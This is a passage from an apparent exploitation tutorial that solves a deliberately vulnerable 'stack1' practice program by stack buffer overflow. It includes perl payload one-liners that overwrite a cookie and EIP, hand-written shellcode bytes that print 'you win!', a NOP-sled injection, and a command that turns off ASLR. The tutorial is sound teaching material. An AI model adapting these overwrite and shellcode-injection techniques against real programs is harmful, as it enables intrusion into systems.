 <span class="err">8048427:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">64</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x64</span>
 <span class="err">804842</span><span class="nl">a:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="err">804842</span><span class="nl">d:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">8048431:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">8048434:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">8048438:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">30</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048530</span>
 <span class="err">804843</span><span class="nl">f:</span> <span class="nf">e8</span> <span class="mi">08</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804834</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
 <span class="err">8048444:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">8048447:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">804844</span><span class="nl">a:</span> <span class="nf">e8</span> <span class="nv">dd</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804832</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
 <span class="err">804844</span><span class="nl">f:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="err">8048452:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
 <span class="err">8048457:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">8048465</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x41</span><span class="o">&gt;</span>
 <span class="err">8048459:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">48</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048548</span>
 <span class="err">8048460:</span> <span class="nf">e8</span> <span class="nv">f7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804835</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
 <span class="err">8048465:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
 <span class="err">8048466:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
 <span class="err">8048467:</span> <span class="err">90</span>                    <span class="nf">nop</span>
</code></pre></div>

<p>From here we could proceed to the exploitation phase.</p>

<h2>Solution #1: Overflow the 4B past buf, where the cookie is stored, with the desired value (<code>0x41424344</code> in this case)</h2>

<p>For this solution we first need to calculate the offset between <code>buf</code>
and <code>cookie</code>:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
buf: bfad87b4 cookie: bfad8804
AAAAAAA

<span class="c1"># printf &quot;offset: %d\n&quot; $((`0xbffff554` - `0xbffff504`))</span>
offset: <span class="m">80</span>
</code></pre></div>

<p>As expected, it came out to be 80B. We craft a perl command-line to
overwrite 80B of data to reach past the <code>buf</code> boundary. Once this is
done, we&#8217;re pointing at the cookie, which can then be overwritten with
the desired content:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;&#39; | ./stack1</span>
buf: bfee2d14 cookie: bfee2d64
you win!
</code></pre></div>

<p><strong>NOTE</strong>: The test system is a x86 Intel machine that uses <a href="http://isisblogs.poly.edu/2012/05/28/endianness/">little-endian</a> byte ordering. We take this into account and reorder individual bytes to set the <code>cookie</code> with appropriate value.</p>

<h2>Solution #2: Overwrite EIP with the address of the printf statement that prints the you win! message</h2>

<p>For the second solution, we need to overwrite EIP with the address of
the <code>printf</code> statement that prints the required <code>you win!</code> message. This
will ensure that when the program returns from <code>main()</code>, control
transfers to stack1&#8217;s <code>.text</code> segment instead of the
<code>__libc_start_main()</code>. But first we need to find the address of the
<code>printf</code> statement from <code>stack1</code>&#8217;s assembly code:</p>

<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
<span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
 <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
 <span class="err">8048427:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">64</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x64</span>
 <span class="err">804842</span><span class="nl">a:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="err">804842</span><span class="nl">d:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">8048431:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">8048434:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">8048438:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">30</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048530</span>
 <span class="err">804843</span><span class="nl">f:</span> <span class="nf">e8</span> <span class="mi">08</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804834</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
 <span class="err">8048444:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">8048447:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">804844</span><span class="nl">a:</span> <span class="nf">e8</span> <span class="nv">dd</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804832</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
 <span class="err">804844</span><span class="nl">f:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="err">8048452:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
 <span class="err">8048457:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">8048465</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x41</span><span class="o">&gt;</span>
 <span class="err">8048459:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">48</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x8048548</span>
 <span class="err">8048460:</span> <span class="nf">e8</span> <span class="nv">f7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">804835</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
 <span class="err">8048465:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
 <span class="err">8048466:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
 <span class="err">8048467:</span> <span class="err">90</span>                    <span class="nf">nop</span>
</code></pre></div>

<p>The last call instruction prepares the stack for a call to <code>puts</code>.
That&#8217;s right, the stack is prepared for <code>puts</code> and not <code>printf</code>. This is
due to a default <a href="http://www.ciselant.de/projects/gcc_printf/gcc_printf.html">GCC optimization option</a> that finds the second <code>printf</code>
call in <code>stack1.c</code> incompatible with its built-in declaration and
replaces (optimizes) it with a call to <code>puts</code>. For our exploit attempts,
we can safely ignore the implicit differences between functions used
here. Since the <code>puts</code> function will do the same thing as <code>printf</code>, we
just want its address for proper control transfer. However we need the
address of the instruction just above call <code>puts</code> as well, because it is
where the <code>you win!</code> message is pushed onto the stack. From the above
output we see that it is <code>0x08048479</code>.</p>

<p>Now that we have the address to overwrite with, we need the exact offset
where we can inject it. For this solution we need to overwrite EIP,
whereas in the previous solution, we overwrote cookie, ie. 4B past buf.
The size of <code>buf</code> was the offset that we used for junk data to reach
<code>cookie</code>. We concluded this offset using the variable adjacency
property. All local variables are placed adjacent to each other at lower
memory addresses in the order in which they were declared in the source
program. As such we could find out the offset of the EIP as well.</p>

<p>Referring the call stack layout we saw earlier, the offset of EIP can be
easily calculated. The <code>buf</code> 80B + cookie 4B + saved Frame Pointer 4B =
88B. This is the offset of EIP from the start of the <code>buf</code> array:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;&#39; | ./stack1</span>
buf: bfebf464 cookie: bfebf4b4
you win!
Segmentation fault
</code></pre></div>

<p>We were able to overwrite EIP and redirect control to a desired
location. This action helped us to bypass the if condition without
actually modifying the contents of the source program.</p>

<h2>Solution #3: Inject and execute a shellcode that simulates the second printf statement, through the internal buf character array</h2>

<p>We now move on to the third solution for this program. We have found
that the program has a buffer in which we can inject junk data and we
also have the ability to redirect control to arbitrary locations. These
two possibilities, when combined together, allow us to execute arbitrary
shellcode. We will design a shellcode that simulates the behavior of the
<code>puts</code> call and inject it within the program buffer. We will then modify
the contents of EIP to point to the buffer where our injected shellcode
ends up. If all goes well, this shellcode will be executed and we will
have the message printed.There is however one thing we will have to
think about before we move ahead. Recall the <code>checksec.sh</code> output above.
It tells that one of the mitigation features, <code>NX</code>, is enabled for the
vulnerable <code>stack1</code> program. This means that when we execute this
binary, it will have its stack segment marked as non-executable:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># readelf -l stack1 | grep -i gnu_stack</span>
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></pre></div>

<p>From the above output, stack is marked as <code>RW</code> for the vulnerable
program. As such, even if we can inject (write) shellcode into <code>buf</code>, we
can not execute it. Any attempts to redirect EIP to our shellcode would
be successful, however, the instant we try to execute shellcode, an
exception would be raised that will eventually terminate the program.
So, we&#8217;ll have to disable this feature for solutions #3 and #4 to work
correctly. But I&#8217;m not going to disable them for now. As you&#8217;ll see, our
exploit attempts would still work in the presence of <code>NX</code> and at the end
of the post I&#8217;ll point out the exact reason for such a behavior. Till
then read on and try to think about why this might be happening.</p>

<p>First we need to design a shellcode that simulates the <code>puts</code> call. I
came up with the following:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># cat -n printf.s</span>
     <span class="m">1</span>  <span class="c1"># printf.s</span>
     <span class="m">2</span>  <span class="c1"># sample program to print &quot;you win!\n&quot; message to stdout</span>
     <span class="m">3</span>
     <span class="m">4</span>  .section .text
     <span class="m">5</span>  .globl _start
     <span class="m">6</span>
     <span class="m">7</span>  _start:
     <span class="m">8</span>    jmp cali
     <span class="m">9</span>
    <span class="m">10</span>  init:
    <span class="m">11</span>    xorl %eax, %eax
    <span class="m">12</span>    xorl %ebx, %ebx
    <span class="m">13</span>    xorl %edx, %edx
    <span class="m">14</span>    mov <span class="nv">$4</span>, %al
    <span class="m">15</span>    mov <span class="nv">$1</span>, %bl
    <span class="m">16</span>    popl %ecx
    <span class="m">17</span>    mov <span class="nv">$9</span>, %dl
    <span class="m">18</span>    int <span class="nv">$0</span>x80
    <span class="m">19</span>
    <span class="m">20</span>    xorl %eax, %eax
    <span class="m">21</span>    incl %eax
    <span class="m">22</span>    xorl %ebx, %ebx
    <span class="m">23</span>    int <span class="nv">$0</span>x80
    <span class="m">24</span>
    <span class="m">25</span>  cali:
    <span class="m">26</span>    call init
    <span class="m">27</span>
    <span class="m">28</span>  msg:
    <span class="m">29</span>    .ascii <span class="s2">&quot;you win!\n&quot;</span>
    <span class="m">30</span>
</code></pre></div>

<p>The above code uses the standard Linux system calls, <code>write</code> and <code>exit</code>,
to print the message and cleanly terminate the program. Using the <code>exit</code>
call will help us to get rid of the annoying segmentation fault we
encountered in the previous solution. Additionally, we also use a few
shellcode writing tricks to remove NULL bytes from our shellcode,
reducing its size and overcoming the addressing problem. Assemble and
link the program to create a standalone binary:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># as -o printf.o printf.s</span>
<span class="c1"># ld -o printf printf.o</span>
<span class="c1"># ./printf</span>
you win!
</code></pre></div>

<p>Here is the objdump for the resultant <code>printf</code> program:</p>

<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">printf</span>

<span class="nl">printf:</span>     <span class="nf">file</span> <span class="nv">format</span> <span class="nv">elf32</span><span class="o">-</span><span class="nv">i386</span>

<span class="nf">Disassembly</span> <span class="nv">of</span> <span class="nv">section</span> <span class="nv">.text</span><span class="p">:</span>

<span class="err">08048054</span> <span class="err">&lt;</span><span class="nf">_start</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048054:</span> <span class="nf">eb</span> <span class="mi">16</span>                 <span class="nv">jmp</span>    <span class="mi">804806</span><span class="nv">c</span> <span class="o">&lt;</span><span class="nv">cali</span><span class="o">&gt;</span>

<span class="err">08048056</span> <span class="err">&lt;</span><span class="nf">init</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048056:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
 <span class="err">8048058:</span> <span class="err">31</span> <span class="kd">db</span>                 <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
 <span class="err">804805</span><span class="nl">a:</span> <span class="err">31</span> <span class="nf">d2</span>                 <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
 <span class="err">804805</span><span class="nl">c:</span> <span class="nf">b0</span> <span class="mi">04</span>                 <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x4</span>
 <span class="err">804805</span><span class="nl">e:</span> <span class="nf">b3</span> <span class="mi">01</span>                 <span class="nv">mov</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>
 <span class="err">8048060:</span> <span class="err">59</span>                    <span class="nf">pop</span>    <span class="nb">ecx</span>
 <span class="err">8048061:</span> <span class="nf">b2</span> <span class="mi">09</span>                 <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x9</span>
 <span class="err">8048063:</span> <span class="nf">cd</span> <span class="mi">80</span>                 <span class="nv">int</span>    <span class="mh">0x80</span>
 <span class="err">8048065:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
 <span class="err">8048067:</span> <span class="err">40</span>                    <span class="nf">inc</span>    <span class="nb">eax</span>
 <span class="err">8048068:</span> <span class="err">31</span> <span class="kd">db</span>                 <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
 <span class="err">804806</span><span class="nl">a:</span> <span class="nf">cd</span> <span class="mi">80</span>                 <span class="nv">int</span>    <span class="mh">0x80</span>

<span class="err">0804806</span><span class="nf">c</span> <span class="o">&lt;</span><span class="nv">cali</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">804806</span><span class="nl">c:</span> <span class="nf">e8</span> <span class="nv">e5</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048056</span> <span class="o">&lt;</span><span class="nv">init</span><span class="o">&gt;</span>

<span class="err">08048071</span> <span class="err">&lt;</span><span class="nf">msg</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048071:</span> <span class="err">79</span> <span class="err">6</span><span class="nf">f</span>                 <span class="nv">jns</span>    <span class="mi">80480</span><span class="nv">e2</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x71</span><span class="o">&gt;</span>
 <span class="err">8048073:</span> <span class="err">75</span> <span class="err">20</span>                 <span class="nf">jne</span>    <span class="mi">8048095</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x24</span><span class="o">&gt;</span>
 <span class="err">8048075:</span> <span class="err">77</span> <span class="err">69</span>                 <span class="nf">ja</span>     <span class="mi">80480</span><span class="nv">e0</span> <span class="o">&lt;</span><span class="nv">msg</span><span class="o">+</span><span class="mh">0x6f</span><span class="o">&gt;</span>
 <span class="err">8048077:</span> <span class="err">6</span><span class="nf">e</span>                    <span class="nv">outs</span>   <span class="nb">dx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="nb">ds</span><span class="p">:[</span><span class="nb">esi</span><span class="p">]</span>
 <span class="err">8048078:</span> <span class="err">21</span> <span class="err">0</span><span class="nf">a</span>                 <span class="nv">and</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span><span class="nb">ecx</span>
</code></pre></div>

<p>Extract opcodes to create the required shellcode and calculate its size:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;&#39; &gt;shellcode.bin</span>
<span class="c1">#</span>
<span class="c1"># ls -lh shellcode.bin</span>
-rw-r--r-- <span class="m">1</span> seed seed <span class="m">38</span> <span class="m">2012</span>-08-27 <span class="m">02</span>:41 shellcode.bin
</code></pre></div>

<p>Now we are ready with the shellcode that simulates the <code>puts</code> call. Once
we inject it, we would need the address of the buffer where this
shellcode will eventually land. Looking at the source and through the
earlier test executions of the <code>stack1</code> program, you already know that
it prints out the address of the <code>buf</code> and the <code>cookie</code> variables. But
we cannot just use the address from an earlier execution for our
exploit. Why is this so? If you had noticed earlier, both <code>buf</code> and
<code>cookie</code>, although adjacent and aligned as expected, had different
address on each invocation:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack1</span>
buf: bfc21614 cookie: bfc21664
AAAA
<span class="c1">#</span>
<span class="c1"># ./stack1</span>
buf: bf9ad354 cookie: bf9ad3a4
AAAA
<span class="c1">#</span>
<span class="c1"># ./stack1</span>
buf: bfd7c3d4 cookie: bfd7c424
AAAA
<span class="c1">#</span>
</code></pre></div>

<p>You would have already guessed by now. It is due to the <code>ASLR</code>
mitigation feature that is active on the test system:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
<span class="m">2</span>
<span class="c1">#</span>
<span class="c1"># ./checksec.sh --proc init</span>
* System-wide ASLR <span class="o">(</span>kernel.randomize_va_space<span class="o">)</span>: On <span class="o">(</span>Setting: <span class="m">2</span><span class="o">)</span>

  Description - Make the addresses of mmap base, heap, stack and VDSO page randomized.
  This, among other things, implies that shared libraries will be loaded to random
  addresses. Also <span class="k">for</span> PIE-linked binaries, the location of code start is randomized.

  See the kernel file <span class="s1">&#39;Documentation/sysctl/kernel.txt&#39;</span> <span class="k">for</span> more details.

* Does the CPU support NX: Yes

         COMMAND    PID RELRO             STACK CANARY           NX/PaX        PIE
            init      <span class="m">1</span> Full RELRO        Canary found           NX enabled    PIE enabled
</code></pre></div>

<p>On systems that support <a href="https://wiki.ubuntu.com/Security/Features#brk_ASLR">brk</a> <a href="https://wiki.ubuntu.com/Security/Features#Address_Space_Layout_Randomisation_.28ASLR.29">ASLR</a>, the
<code>/proc/sys/kernel/randomize_va_space</code> file stores a value of 2. On other
systems it stores a value of 1 by default to indicate the presence of
vanilla <code>ASLR</code>. Modifying this file with a value of 0 will immediately
turn off this feature for all newly spawned processes:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># cat /proc/sys/kernel/randomize_va_space</span>
<span class="m">2</span>
<span class="c1">#</span>
<span class="c1"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span>
<span class="c1">#</span>
<span class="c1"># ./stack1</span>
buf: bffff4d4 cookie: bffff524
AAAA
<span class="c1">#</span>
<span class="c1"># ./stack1</span>
buf: bffff4d4 cookie: bffff524
AAAA
<span class="c1">#</span>
<span class="c1"># ./stack1</span>
buf: bffff4d4 cookie: bffff524
AAAA
</code></pre></div>

<p>For all the 3 invocations of <code>stack1</code> program, the locations for <code>buf</code>
(<code>0xbffff4d4</code>) and <code>cookie</code> (<code>0xbffff524</code>) remains constant. Since the <code>buf</code>
is always placed at a known static address, we could use it for EIP
redirection. Let&#8217;s proceed to the exploitation phase. Since the
shellcode is of size 38B and the <code>buf</code> is located at an offset of 88B
from the EIP, we have a junk space of 50B. We could use this space to
increase the reliability of our exploit by adding a NOP sled at the
start of our shellcode. This although is not required as we are already
aware of the location of our shellcode. But we still have to fill this
space with junk bytes to reach the offset of EIP. Let&#8217;s craft a perl
command-line to inject our shellcode at the location where this correct
address could be overwritten. However, we were not able to get the
shellcode executed:</p>

<div class="codehilite"><pre><span></span><code>./stack1
buf: bffff4d4 cookie: bffff524
AAAA
<span class="c1">#</span>
<span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
buf: bffff4d4 cookie: bffff524
</code></pre></div>

<p>Sadly, it did not work. The offset calculation was correct, address for
EIP overwrite also points to our shellcode, and we actually have a
working shellcode that, if executed, should display the winning message.
What could have gone wrong? A GDB analysis could help but this specific
issue could be debugged without using it. Have a look at the shellcode
once again:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># hexdump -C shellcode.bin</span>
<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">09</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y...<span class="p">|</span>
<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
<span class="m">00000026</span>
</code></pre></div>

<p>The shellcode above is copied into the <code>buf</code> array through the <code>gets</code>
function, which parses newline or EoF as input terminating characters.
Unfortunately, the shellcode we so carefully prepared contains a newline
as its last byte. This came in through the <code>you win!</code> message and it is
indeed the culprit here. The earlier exploit command-line breaks at the
<code>0x0a</code> byte on offset 87, failing to overwrite further stack locations.
The EIP at offset 88 is untouched and we fail to gain successful
exploitation.</p>

<p>We could quickly modify the <code>printf.s</code> program and generate a new
shellcode that has the message with no newline character. However, a
quick hack can be to remove the newline from the exploit command-line
and test it:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
buf: bffff4d4 cookie: bffff524
<span class="c1">#</span>
<span class="c1"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xd4\xf4\xff\xbf&quot;&#39; | ./stack1</span>
buf: bffff4d4 cookie: bffff524
you win!
</code></pre></div>

<p>It did work! Although a junk byte was appended to the winning message,
it really does not matter for this example. We are clear (hopefully :)
with the exploitation technique and it is all that matters. Notice
however that we used the address of <code>buf</code> to jump back to our shellcode
and it is one thing which makes our exploit highly unreliable. There are
certain techniques through which you can reliably jump to your shellcode
without using memory addresses that could possibly differ between
multiple systems. Please refer the <a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">Exploit writing tutorial part 2 :
Stack Based Overflows - jumping to
shellcode</a>
post from <a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a> for more details.</p>

<p>For this solution, we turned off another mitigation feature (<code>ASLR</code>).
Even in its presence we were able to gain successful exploitation (using
solutions #1 and #2) but that was because we had alternate tricks.
However, those were very specific to the vulnerable <code>stack1</code> program.
They won&#8217;t always work, but you now understand that an insight about how
things really work, could help with designing custom solutions and
hacking around any limitations that stop you from gaining successful
exploitation. This solution helped us to get an insight into how useful
addressing information could be for an exploit writer and how the <code>ASLR</code>
technique helps to mitigate exploit attempts that use such information.</p>

<h2>Solution #4: Inject and execute a shellcode, that simulates the second printf statement, through an environment variable and overwrite EIP with its address</h2>

